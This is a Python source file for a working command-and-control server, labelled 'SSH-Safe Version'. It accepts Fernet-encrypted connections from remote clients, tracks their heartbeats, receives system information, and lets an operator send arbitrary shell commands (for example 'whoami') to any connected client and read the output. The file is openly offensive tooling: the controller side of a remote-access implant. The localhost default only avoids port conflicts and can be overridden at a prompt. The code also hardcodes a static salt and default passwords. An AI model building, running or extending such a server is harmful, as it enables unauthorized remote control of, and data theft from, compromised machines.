#!/usr/bin/env python3
"""
C2 Server (SSH-Safe Version) - Binds only to localhost to avoid SSH interference
"""

import socket
import threading
import json
import base64
import time
from datetime import datetime
import os
import sys
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC

class SafeC2Server:
    def __init__(self, host='127.0.0.1', port=8888, password='default_password'):
        # SAFE: Bind only to localhost by default, not all interfaces
        self.host = host
        self.port = port
        self.password = password
        self.clients = {}
        self.running = False
        
        # Generate encryption key from password
        self.key = self._generate_key(password)
        self.cipher = Fernet(self.key)
        
        # Create directories
        os.makedirs('downloads', exist_ok=True)
        os.makedirs('uploads', exist_ok=True)
        
    def _generate_key(self, password):
        """Generate encryption key from password"""
        salt = b'salt_1234567890'  # In production, use random salt per client
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = base64.urlsafe_b64encode(kdf.derive(password.encode()))
        return key
    
    def encrypt_data(self, data):
        """Encrypt data using Fernet"""
        if isinstance(data, str):
            data = data.encode()
        return self.cipher.encrypt(data)
    
    def decrypt_data(self, encrypted_data):
        """Decrypt data using Fernet"""
        return self.cipher.decrypt(encrypted_data).decode()
    
    def send_encrypted(self, conn, data):
        """Send encrypted data to client"""
        try:
            if isinstance(data, dict):
                data = json.dumps(data)
            
            encrypted = self.encrypt_data(data)
            # Send length first, then data
            length = len(encrypted)
            conn.send(length.to_bytes(4, byteorder='big'))
            conn.send(encrypted)
            return True
        except Exception as e:
            print(f"[ERROR] Failed to send data: {e}")
            return False
    
    def recv_encrypted(self, conn):
        """Receive encrypted data from client"""
        try:
            # Receive length first
            length_bytes = conn.recv(4)
            if not length_bytes:
                return None
            
            length = int.from_bytes(length_bytes, byteorder='big')
            
            # Receive the actual data
            encrypted_data = b''
            while len(encrypted_data) < length:
                chunk = conn.recv(min(length - len(encrypted_data), 4096))
                if not chunk:
                    return None
                encrypted_data += chunk
            
            # Decrypt and return
            decrypted = self.decrypt_data(encrypted_data)
            return json.loads(decrypted)
        except Exception as e:
            print(f"[ERROR] Failed to receive data: {e}")
            return None
    
    def handle_client(self, conn, addr):
        """Handle individual client connections"""
        client_id = f"{addr[0]}:{addr[1]}"
        print(f"[+] New client connected: {client_id}")
        
        # Store client info
        self.clients[client_id] = {
            'conn': conn,
            'addr': addr,
            'last_heartbeat': time.time(),
            'status': 'connected'
        }
        
        try:
            while self.running:
                # Set timeout for receiving data
                conn.settimeout(1.0)
                
                try:
                    data = self.recv_encrypted(conn)
                    if data is None:
                        break
                    
                    self.process_client_message(client_id, data)
                    
                except socket.timeout:
                    # Check if client is still alive (heartbeat timeout)
                    if time.time() - self.clients[client_id]['last_heartbeat'] > 360:  # 6 minutes timeout
                        print(f"[-] Client {client_id} heartbeat timeout")
                        break
                    continue
                    
                except Exception as e:
                    print(f"[ERROR] Error handling client {client_id}: {e}")
                    break
                    
        except Exception as e:
            print(f"[ERROR] Client handler error: {e}")
        finally:
            print(f"[-] Client {client_id} disconnected")
            if client_id in self.clients:
                del self.clients[client_id]
            try:
                conn.close()
            except:
                pass
    
    def process_client_message(self, client_id, data):
        """Process messages received from clients"""
        msg_type = data.get('type')
        
        if msg_type == 'heartbeat':
            self.clients[client_id]['last_heartbeat'] = time.time()
            print(f"[♥] Heartbeat from {client_id} - {datetime.now().strftime('%H:%M:%S')}")
            
        elif msg_type == 'command_result':
            print(f"\n[COMMAND RESULT from {client_id}]")
            print(f"Command: {data.get('command', 'Unknown')}")
            print(f"Output:\n{data.get('output', 'No output')}")
            print("-" * 50)
            
        elif msg_type == 'system_info':
            print(f"\n[SYSTEM INFO from {client_id}]")
            for key, value in data.get('info', {}).items():
                print(f"{key}: {value}")
            print("-" * 50)
    
    def send_command_to_client(self, client_id, command):
        """Send command to specific client"""
        if client_id not in self.clients:
            print(f"[ERROR] Client {client_id} not found")
            return False
            
        message = {
            'type': 'command',
            'command': command,
            'timestamp': time.time()
        }
        
        success = self.send_encrypted(self.clients[client_id]['conn'], message)
        if success:
            print(f"[+] Command sent to {client_id}: {command}")
        else:
            print(f"[ERROR] Failed to send command to {client_id}")
        return success
    
    def list_clients(self):
        """List all connected clients"""
        if not self.clients:
            print("[INFO] No clients connected")
            return
            
        print("\n[CONNECTED CLIENTS]")
        print("Client ID\t\tLast Heartbeat\t\tStatus")
        print("-" * 60)
        
        for client_id, info in self.clients.items():
            last_hb = datetime.fromtimestamp(info['last_heartbeat']).strftime('%H:%M:%S')
            print(f"{client_id}\t{last_hb}\t\t{info['status']}")
        print()
    
    def start(self):
        """Start the C2 server (SSH-safe version)"""
        self.running = True
        
        # Create server socket with more conservative settings
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        
        # SAFER: Don't use SO_REUSEADDR to avoid conflicts
        # server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind((self.host, self.port))
            server_socket.listen(5)
            
            print(f"[+] SSH-Safe C2 Server started on {self.host}:{self.port}")
            print(f"[+] NOTE: Binding to {self.host} only (not all interfaces)")
            print(f"[+] This should NOT interfere with SSH access")
            print(f"[+] Downloads directory: ./downloads/")
            print("\n[COMMANDS]")
            print("  list                    - List connected clients")
            print("  cmd <client_id> <cmd>   - Send command to specific client")
            print("  help                    - Show help")
            print("  quit                    - Exit server")
            print("-" * 60)
            
            # Start command line interface in separate thread
            cli_thread = threading.Thread(target=self.command_interface, daemon=True)
            cli_thread.start()
            
            # Accept client connections
            while self.running:
                try:
                    server_socket.settimeout(1.0)
                    conn, addr = server_socket.accept()
                    
                    # Handle client in separate thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(conn, addr),
                        daemon=True
                    )
                    client_thread.start()
                    
                except socket.timeout:
                    continue
                except Exception as e:
                    if self.running:
                        print(f"[ERROR] Server error: {e}")
                        
        except Exception as e:
            print(f"[ERROR] Failed to start server: {e}")
        finally:
            try:
                server_socket.close()
            except:
                pass
            print("[+] Server shutdown complete")
    
    def command_interface(self):
        """Command line interface for server control"""
        while self.running:
            try:
                cmd = input().strip()
                if not cmd:
                    continue
                    
                parts = cmd.split(' ', 2)
                command = parts[0].lower()
                
                if command in ['quit', 'exit', 'stop']:
                    print("[+] Shutting down server...")
                    self.running = False
                    break
                    
                elif command == 'list':
                    self.list_clients()
                    
                elif command == 'help':
                    self.show_help()
                    
                elif command == 'cmd' and len(parts) >= 3:
                    client_id = parts[1]
                    client_cmd = parts[2]
                    self.send_command_to_client(client_id, client_cmd)
                    
                else:
                    print("[ERROR] Invalid command. Type 'help' for available commands.")
                    
            except KeyboardInterrupt:
                print("\n[+] Shutting down server...")
                self.running = False
                break
            except EOFError:
                self.running = False
                break
            except Exception as e:
                print(f"[ERROR] Command interface error: {e}")
    
    def show_help(self):
        """Show help information"""
        print("\n[SSH-SAFE C2 SERVER COMMANDS]")
        print("  list                      - List all connected clients")
        print("  cmd <client_id> <command> - Send command to specific client")
        print("  help                      - Show this help")
        print("  quit/exit/stop            - Exit server safely")
        print("\n[EXAMPLES]")
        print("  list")
        print("  cmd 127.0.0.1:12345 whoami")
        print("-" * 60)

def main():
    print("=" * 60)
    print("SSH-SAFE C2 SERVER")
    print("=" * 60)
    print("This version binds only to localhost to avoid SSH conflicts")
    print()
    
    # Get configuration
    if len(sys.argv) > 1:
        password = sys.argv[1]
    else:
        password = input("Enter server password (default: 'safe123'): ").strip()
        if not password:
            password = 'safe123'
    
    # Ask for host binding (safety check)
    host_input = input("Bind to (localhost/127.0.0.1 recommended): ").strip()
    if not host_input:
        host = '127.0.0.1'
    else:
        host = host_input
        if host in ['0.0.0.0', '*']:
            print("⚠️  WARNING: Binding to all interfaces may interfere with SSH!")
            confirm = input("Are you sure? (yes/no): ").strip().lower()
            if confirm != 'yes':
                host = '127.0.0.1'
                print("Defaulting to localhost (127.0.0.1)")
    
    server = SafeC2Server(host=host, password=password)
    
    try:
        server.start()
    except KeyboardInterrupt:
        print("\n[+] Server shutting down...")
        server.running = False

if __name__ == "__main__":
    main()